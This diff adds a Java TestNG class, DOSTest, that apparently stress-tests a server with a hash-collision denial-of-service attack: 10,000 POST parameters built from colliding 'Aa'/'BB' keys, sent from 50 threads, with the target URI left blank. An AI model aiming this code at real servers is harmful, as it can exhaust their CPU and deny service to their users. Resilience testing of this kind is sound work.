@@ -1,0 +1,35 @@
+
+public class DOSTest {
+
+    private static String URI = "";
+
+    private String        BB  = "BB";
+    private String        Aa  = "Aa";
+
+    @Test(threadPoolSize = 50, invocationCount = 20)
+    public void test() throws HttpException, IOException {
+        HttpClient httpClient = HttpClientUtil.getHttpClient();
+
+        PostMethod method = new PostMethod(URI);
+        for (int i = 0; i < 10000; i++) {
+
+            method.addParameter(getKey(i), "aaaa");
+        }
+        httpClient.executeMethod(method);
+        System.out.println("end");
+    }
+
+    private String getKey(int i) {
+        String result = "";
+        String binary = Integer.toBinaryString(i);
+        for (int l = 0; l < binary.length(); l++) {
+            char s = binary.charAt(l);
+            if (s == '1') {
+                result += BB;
+            } else {
+                result += Aa;
+            }
+        }
+        return result;
+    }
+}
